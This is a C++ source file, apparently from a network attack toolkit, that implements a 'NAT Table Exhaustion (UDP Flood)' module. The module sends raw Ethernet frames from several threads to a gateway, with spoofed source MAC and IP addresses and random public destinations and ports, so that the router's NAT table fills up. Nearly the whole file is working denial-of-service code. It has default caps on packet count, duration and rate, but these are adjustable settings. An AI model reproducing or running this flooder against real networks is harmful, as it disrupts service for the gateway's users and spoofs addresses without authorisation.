#include <iostream>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <random>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <cstring>
#include <chrono>
#include <cerrno>
#include <cstdlib>
#include <ctime>
#include <algorithm>
#include <sstream>
#include <vector>
#include <net/ethernet.h> 
#include <net/if.h>
#include <linux/if_packet.h>
#include <fcntl.h>


#include "../headers/nat.h"
#include "../headers/helperfuncs.h"


// Helper function to parse MAC address string
std::vector<uint8_t> parse_mac_address(const std::string& mac_str) {
    std::vector<uint8_t> mac_addr;
    std::stringstream ss(mac_str);
    std::string segment;

    while(std::getline(ss, segment, ':')) {
        mac_addr.push_back(std::stoul(segment, nullptr, 16));
    }
    return mac_addr;
}


// Standard Internet Checksum
unsigned short checksum(void* b, int len) {
    unsigned short *buf = (unsigned short*)b;
    unsigned int sum = 0;
    unsigned short result;

    for (sum = 0; len > 1; len -= 2)
        sum += *buf++;
    if (len == 1)
        sum += *(unsigned char*)buf;
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    result = ~sum;
    return result;
}


NAT::NAT(AttackMode mode)
    : running(false),
      attempted_packets(0),
      sent_packets(0),
      failed_packets(0),
      backpressure_count(0),
      enobufs_count(0),
      backpressure_note_printed(false),
      stop_reason(STOP_NONE),
      mode(mode),
      worker_count(4),
      max_duration_seconds(30),
      max_packets_total(3000),
      packets_per_second_total(100),
      enobufs_backoff_ms(50),
      summary_printed(false) {
    srand(time(0));
}

NAT::~NAT() {
    stop();
}

std::string NAT::get_name() {
    return "NAT Table Exhaustion (UDP Flood)";
}

void NAT::stop() {
    bool had_threads = !attack_threads.empty();
    if (running) {
        request_stop(STOP_USER);
    }

    for (auto& t : attack_threads) {
        if (t.joinable()) t.join();
    }

    if (had_threads) {
        print_summary();
    }

    attack_threads.clear();
}

std::string NAT::generate_random_public_ip() {
    // Exclude private ranges. This is a simplified check.
    while (true) {
        int o1 = rand() % 223 + 1; // Avoid 0, 127, 224+
        int o2 = rand() % 256;
        int o3 = rand() % 256;
        int o4 = rand() % 254 + 1; // Avoid 0 and 255 for broadcast

        if (o1 == 10 || o1 == 127) continue;
        if (o1 == 172 && (o2 >= 16 && o2 <= 31)) continue;
        if (o1 == 192 && o2 == 168) continue;
        if (o1 >= 224) continue; // Multicast/Reserved

        return std::to_string(o1) + "." + std::to_string(o2) + "." + std::to_string(o3) + "." + std::to_string(o4);
    }
}

// Generates a random IP within the same /24 subnet as the given IP
std::string NAT::generate_random_local_ip(const std::string& local_ip) {
    if (local_ip.empty()) {
        // Fallback for safety, though run() should prevent this.
        return "192.168.1." + std::to_string(rand() % 254 + 1);
    }
    size_t last_dot = local_ip.rfind('.');
    std::string subnet = local_ip.substr(0, last_dot + 1);
    return subnet + std::to_string(rand() % 254 + 2); // Avoid .0, .1, .255
}


void NAT::run(Session* session) {
    if (running) {
        std::cout << "[-] NAT Exhaustion is already running." << std::endl;
        return;
    }

    if (session->interface.empty()) {
        std::cerr << "[-] Error: Interface not set in session." << std::endl;
        return;
    }

    if (session->gateway_ip.empty()) {
        std::cerr << "[-] Error: Gateway IP not set in session. Please set it in Target Configuration." << std::endl;
        return;
    }

    std::string local_ip = session->helper->get_local_ip(session->interface.c_str());
    if (local_ip.empty()) {
        std::cerr << "[-] Error: Could not determine local IP for interface " << session->interface << std::endl;
        return;
    }

    // Get gateway MAC address
    HelperFunctions hf;
    std::string gateway_mac_str = hf.get_mac_from_ip(session->gateway_ip);
    if (gateway_mac_str.empty() || gateway_mac_str == "00:00:00:00:00:00") {
        std::cerr << "[-] Error: Could not determine gateway MAC address. Make sure the gateway is in the ARP cache." << std::endl;
        return;
    }

    std::vector<uint8_t> gateway_mac;
    try {
        gateway_mac = parse_mac_address(gateway_mac_str);
    } catch (const std::exception& ex) {
        std::cerr << "[-] Error: Invalid gateway MAC address '" << gateway_mac_str << "': " << ex.what() << std::endl;
        return;
    }
    if (gateway_mac.size() != ETH_ALEN) {
        std::cerr << "[-] Error: Invalid gateway MAC address '" << gateway_mac_str << "'." << std::endl;
        return;
    }

    int ifindex = if_nametoindex(session->interface.c_str());
    if (ifindex == 0) {
        std::cerr << "[-] Error: Could not resolve interface index for " << session->interface
                  << ": " << std::strerror(errno) << std::endl;
        return;
    }

    int probe_sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_IP));
    if (probe_sock < 0) {
        std::cerr << "[-] Error: Could not open AF_PACKET raw socket: "
                  << std::strerror(errno) << std::endl;
        return;
    }
    close(probe_sock);

    reset_stats();
    running = true;
    start_time = std::chrono::steady_clock::now();

    int effective_total_rate = packets_per_second_total > 0 ? packets_per_second_total : 1;
    int effective_worker_count = std::max(1, std::min(worker_count, effective_total_rate));
    int per_worker_rate = std::max(1, effective_total_rate / effective_worker_count);

    std::cout << C_GREEN << "[*] NAT Exhaustion starting." << C_RESET << std::endl;
    std::cout << "    Interface: " << session->interface << " (index " << ifindex << ")" << std::endl;
    std::cout << "    Local IP: " << local_ip << std::endl;
    std::cout << "    Gateway IP: " << session->gateway_ip << std::endl;
    std::cout << "    Gateway MAC: " << gateway_mac_str << std::endl;
    std::cout << "    Workers: " << effective_worker_count << std::endl;
    std::cout << "    Max packets: " << max_packets_total << std::endl;
    std::cout << "    Max duration: " << max_duration_seconds << "s" << std::endl;
    std::cout << "    Rate limit: " << effective_total_rate << " packets/sec total" << std::endl;

    for (int i = 0; i < effective_worker_count; i++) {
        attack_threads.emplace_back(&NAT::exhaust_loop, this, local_ip, session->interface,
                                    ifindex, gateway_mac, i, per_worker_rate);
    }
}

void NAT::exhaust_loop(std::string local_ip, std::string interface_name, int ifindex,
                       std::vector<uint8_t> gateway_mac, int thread_id, int packets_per_second) {
    int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_IP));
    if (sock < 0) {
        std::lock_guard<std::mutex> lock(log_mutex);
        std::cerr << C_RED << "[-] NAT worker " << thread_id << " socket creation failed: "
                  << std::strerror(errno) << C_RESET << std::endl;
        failed_packets++;
        return;
    }

    int flags = fcntl(sock, F_GETFL, 0);
    if (flags >= 0 && fcntl(sock, F_SETFL, flags | O_NONBLOCK) < 0) {
        std::lock_guard<std::mutex> lock(log_mutex);
        std::cerr << C_YELLOW << "[!] NAT worker " << thread_id << " could not set non-blocking socket: "
                  << std::strerror(errno) << C_RESET << std::endl;
    }

    // --- Start of performance improvements ---

    // Set up a high-quality random number generator for this thread.
    std::random_device rd;
    std::mt19937 gen(rd() + thread_id);
    std::uniform_int_distribution<uint32_t> u32_dist;
    std::uniform_int_distribution<uint16_t> u16_dist;
    std::uniform_int_distribution<uint16_t> port_dist(1, 65535);
    std::uniform_int_distribution<uint8_t> host_dist(2, 254);

    // Pre-calculate the source subnet to avoid string operations in the loop.
    uint32_t src_net;
    struct in_addr addr;
    if (inet_aton(local_ip.c_str(), &addr) == 0) {
        src_net = (192 << 24) | (168 << 16) | (1 << 8); // Default to 192.168.1.0/24
    } else {
        src_net = ntohl(addr.s_addr) & 0xFFFFFF00; // Extract /24 network, host byte order
    }

    // --- End of performance improvements ---

    // Prepare packet buffer and headers
    const int packet_len = sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct udphdr);
    char packet[packet_len];
    struct ether_header *eth = (struct ether_header *)packet;
    struct iphdr *iph = (struct iphdr *)(packet + sizeof(struct ether_header));
    struct udphdr *udph = (struct udphdr *)(packet + sizeof(struct ether_header) + sizeof(struct iphdr));
    
    // Prepare socket address for sending
    struct sockaddr_ll socket_address;
    memset(&socket_address, 0, sizeof(socket_address));
    socket_address.sll_family = AF_PACKET;
    socket_address.sll_protocol = htons(ETH_P_IP);
    socket_address.sll_ifindex = ifindex;
    socket_address.sll_halen = ETH_ALEN;
    memcpy(socket_address.sll_addr, gateway_mac.data(), ETH_ALEN);

    const int effective_packets_per_second = packets_per_second > 0 ? packets_per_second : 1;
    const int effective_enobufs_backoff_ms = enobufs_backoff_ms > 0 ? enobufs_backoff_ms : 1;
    const auto send_interval = std::chrono::microseconds(1000000 / effective_packets_per_second);
    auto next_send_time = std::chrono::steady_clock::now();
    auto last_error_log = next_send_time - std::chrono::seconds(1);

    while (running) {
        const auto now = std::chrono::steady_clock::now();
        if (max_duration_seconds > 0 &&
            now - start_time >= std::chrono::seconds(max_duration_seconds)) {
            request_stop(STOP_MAX_DURATION);
            break;
        }

        if (now < next_send_time) {
            std::this_thread::sleep_until(next_send_time);
        }
        if (!running) {
            break;
        }
        next_send_time += send_interval;

        long reserved_packet = attempted_packets.fetch_add(1);
        if (max_packets_total > 0 && reserved_packet >= max_packets_total) {
            attempted_packets.fetch_sub(1);
            request_stop(STOP_MAX_PACKETS);
            break;
        }

        memset(packet, 0, packet_len);

        // --- L2 - Ethernet Header ---
        uint32_t rand_mac1 = u32_dist(gen);
        uint16_t rand_mac2 = u16_dist(gen);
        memcpy(eth->ether_shost, &rand_mac1, 4);
        memcpy(eth->ether_shost + 4, &rand_mac2, 2);
        memcpy(eth->ether_dhost, gateway_mac.data(), ETH_ALEN);
        eth->ether_type = htons(ETH_P_IP);


        // --- L3 - IP Header ---
        uint32_t spoofed_src_ip_int = src_net | host_dist(gen);

        uint32_t random_dest_ip_int;
        uint8_t o1, o2;
        do {
            random_dest_ip_int = u32_dist(gen);
            o1 = (random_dest_ip_int >> 24) & 0xFF;
            o2 = (random_dest_ip_int >> 16) & 0xFF;
        } while (o1 == 10 || o1 == 127 || (o1 == 172 && o2 >= 16 && o2 <= 31) || (o1 == 192 && o2 == 168) || o1 >= 224 || o1 == 0);


        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr));
        iph->id = htons(u16_dist(gen));
        iph->frag_off = 0;
        iph->ttl = 64;
        iph->protocol = IPPROTO_UDP;
        iph->check = 0; 
        iph->saddr = htonl(spoofed_src_ip_int);
        iph->daddr = htonl(random_dest_ip_int);

        // --- L4 - UDP Header ---
        udph->source = htons(port_dist(gen));
        udph->dest = htons(port_dist(gen));
        udph->len = htons(sizeof(struct udphdr));
        udph->check = 0; 

        // Calculate IP checksum
        iph->check = checksum((unsigned short *)iph, sizeof(struct iphdr));

        if (sendto(sock, packet, packet_len, 0, (struct sockaddr *)&socket_address, sizeof(socket_address)) < 0) {
            int saved_errno = errno;
            failed_packets++;

            bool is_backpressure = saved_errno == ENOBUFS ||
                                   saved_errno == EAGAIN ||
                                   saved_errno == EWOULDBLOCK;
            if (is_backpressure) {
                backpressure_count++;
                if (saved_errno == ENOBUFS) enobufs_count++;
                print_backpressure_note();
                std::this_thread::sleep_for(std::chrono::milliseconds(effective_enobufs_backoff_ms));
            } else {
                log_unexpected_send_error(thread_id, saved_errno, last_error_log);
            }
        } else {
            sent_packets++;
        }
    }

    close(sock);
}

void NAT::reset_stats() {
    attempted_packets = 0;
    sent_packets = 0;
    failed_packets = 0;
    backpressure_count = 0;
    enobufs_count = 0;
    backpressure_note_printed = false;
    stop_reason = STOP_NONE;
    summary_printed = false;
}

void NAT::request_stop(StopReason reason) {
    int expected = STOP_NONE;
    stop_reason.compare_exchange_strong(expected, reason);
    running = false;
}

const char* NAT::stop_reason_text() const {
    switch (stop_reason.load()) {
        case STOP_USER: return "stopped by user";
        case STOP_MAX_DURATION: return "max duration reached";
        case STOP_MAX_PACKETS: return "max packet count reached";
        default: return "stopped";
    }
}

void NAT::print_summary() {
    if (summary_printed) return;

    const auto elapsed_ms = std::chrono::duration_cast<std::chrono::milliseconds>(
        std::chrono::steady_clock::now() - start_time).count();

    std::cout << C_GREEN << "[+] NAT Exhaustion stopped (" << stop_reason_text() << "). "
              << "Attempted: " << attempted_packets.load()
              << ", sent: " << sent_packets.load()
              << ", failed: " << failed_packets.load()
              << ", backpressure: " << backpressure_count.load()
              << ", ENOBUFS: " << enobufs_count.load()
              << ", elapsed: " << (elapsed_ms / 1000.0) << "s"
              << C_RESET << std::endl;

    if (backpressure_count.load() > 0) {
        std::cout << C_YELLOW
                  << "    Backpressure note: EAGAIN/EWOULDBLOCK means the non-blocking raw socket or kernel queue was temporarily full; ENOBUFS means local send buffers were unavailable. The sender backed off and continued."
                  << C_RESET << std::endl;
    }

    summary_printed = true;
}

void NAT::print_backpressure_note() {
    bool expected = false;
    if (!backpressure_note_printed.compare_exchange_strong(expected, true)) {
        return;
    }

    std::lock_guard<std::mutex> lock(log_mutex);
    std::cout << C_YELLOW
              << "[*] NAT sender experiencing kernel backpressure; continuing with backoff. Details will be shown in summary."
              << C_RESET << std::endl;
}

void NAT::log_unexpected_send_error(int thread_id, int error_code,
                                    std::chrono::steady_clock::time_point& last_error_log) {
    const auto error_now = std::chrono::steady_clock::now();
    if (error_now - last_error_log < std::chrono::seconds(1)) {
        return;
    }

    std::lock_guard<std::mutex> lock(log_mutex);
    std::cerr << C_YELLOW << "[!] NAT worker " << thread_id << " send failed: "
              << std::strerror(error_code)
              << " (unexpected send errors are rate-limited)" << C_RESET << std::endl;
    last_error_log = error_now;
}
